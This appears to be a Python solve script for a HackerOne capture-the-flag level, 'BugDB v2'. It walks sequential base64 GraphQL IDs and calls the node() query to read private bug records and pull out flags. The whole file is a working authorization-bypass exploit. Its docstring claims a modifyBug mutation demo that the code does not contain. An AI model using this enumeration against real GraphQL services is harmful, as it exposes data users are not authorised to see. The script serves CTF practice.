#!/usr/bin/env python3
"""
PoC: BugDB v2 (HackerOne CTF)
Exploits the same GraphQL node() query authorization bypass from v1,
plus demonstrates the unauthenticated modifyBug mutation.

Usage: python3 solve.py <ctf_url>
"""

import sys
import json
import requests

FLAG_PATTERN = "^FLAG^"


def graphql(base_url, query, variables=None):
    """Execute a GraphQL query against the target."""
    url = base_url.rstrip("/") + "/graphql"
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    resp = requests.post(url, json=payload, timeout=15)
    resp.raise_for_status()
    return resp.json()


def get_all_bugs(base_url):
    """Get all visible bugs via allBugs (only non-private)."""
    query = "{ allBugs { id private } }"
    return graphql(base_url, query)["data"]["allBugs"]


def get_bug_via_node(base_url, bug_id):
    """Get full bug text via node() query with inline fragment on Bugs."""
    query = """
    query GetBug($id: ID!) {
        node(id: $id) {
            id
            __typename
            ... on Bugs {
                text
                private
                reporter { username }
            }
        }
    }
    """
    return graphql(base_url, query, {"id": bug_id})["data"]["node"]


def get_all_bug_ids(base_url):
    """Enumerate all bug IDs that exist (even if not visible in allBugs)."""
    bugs = []
    for i in range(1, 20):
        # Bugs IDs are base64("Bugs:N")
        import base64
        gid = base64.b64encode(f"Bugs:{i}".encode()).decode()
        try:
            result = graphql(
                base_url,
                "query($id: ID!) { node(id: $id) { id __typename } }",
                {"id": gid},
            )
            if result.get("data", {}).get("node"):
                bugs.append(gid)
        except Exception:
            pass
    return bugs


def extract_flag(text):
    """Extract flag hex from a string containing ^FLAG^...$FLAG$."""
    if FLAG_PATTERN in text:
        start = text.index(FLAG_PATTERN) + len(FLAG_PATTERN)
        end = text.index("$FLAG$", start)
        return text[start:end]
    return None


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ctf_base_url>")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    print(f"[*] Target: {base_url}")
    print()

    # Step 1: Find all bug IDs via enumeration
    print("[*] Enumerating all bug IDs...")
    try:
        bug_ids = get_all_bug_ids(base_url)
        print(f"[+] Found {len(bug_ids)} bug(s): {bug_ids}")
    except Exception as e:
        print(f"[-] Enumeration failed: {e}")
        sys.exit(1)

    # Step 2: Access each bug via node() query
    print()
    print("[*] Accessing bug text via node() query...")
    flags = []

    for bug_id in bug_ids:
        try:
            detail = get_bug_via_node(base_url, bug_id)
            text = detail.get("text", "")
            private = detail.get("private", False)
            reporter = detail.get("reporter", {}).get("username", "unknown")
            print(f"[+] Bug {bug_id}: reporter={reporter} private={private}")
            print(f"    Text: {text[:80]}{'...' if len(text) > 80 else ''}")

            flag = extract_flag(text)
            if flag:
                flags.append(flag)
                print(f"    [***] FLAG FOUND: {flag}")
        except Exception as e:
            print(f"[-] Failed to get bug {bug_id}: {e}")

    # Summary
    print()
    if flags:
        for i, flag in enumerate(flags):
            print(f"[+] Flag {i}: {flag}")
    else:
        print("[-] No flags found.")


if __name__ == "__main__":
    main()
